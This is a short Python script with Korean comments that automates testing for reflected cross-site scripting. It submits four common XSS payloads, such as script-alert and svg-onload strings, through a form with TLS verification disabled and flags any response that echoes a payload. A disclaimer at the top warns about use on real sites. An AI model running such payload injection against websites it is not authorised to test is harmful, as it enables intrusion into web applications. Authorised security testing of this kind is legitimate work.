# 해당 코드로 실제 웹사이트에 적용시 발생되는 불이익은 책임지지 않습니다. 사용시 주의 바랍니다.

import requests
from bs4 import BeautifulSoup
import re

payloads = {
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>", 
    "'';!--<XSS>=&{()}"
}

# 테스트할 URL
url = ""


form_data = {
    "username":"testuser",
    "password":"testpass"
}

def test_xss(payloads,url,form_data):
    for payload in payloads:
        print(f"Testing payload: {payload}")

        
        form_data['input_field'] = payload

        response = requests.post(url, data=form_data, verify=False)


        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")
            print("Vulnerable Page Content:")
            print(response.text[:500])  # 응답 HTML 일부 출력 (최대 500자)
        else:
            print(f"No vulnerability found with payload: {payload}")
        print("-" * 50)

# XSS 자동화 실행
test_xss(payloads, url, form_data)
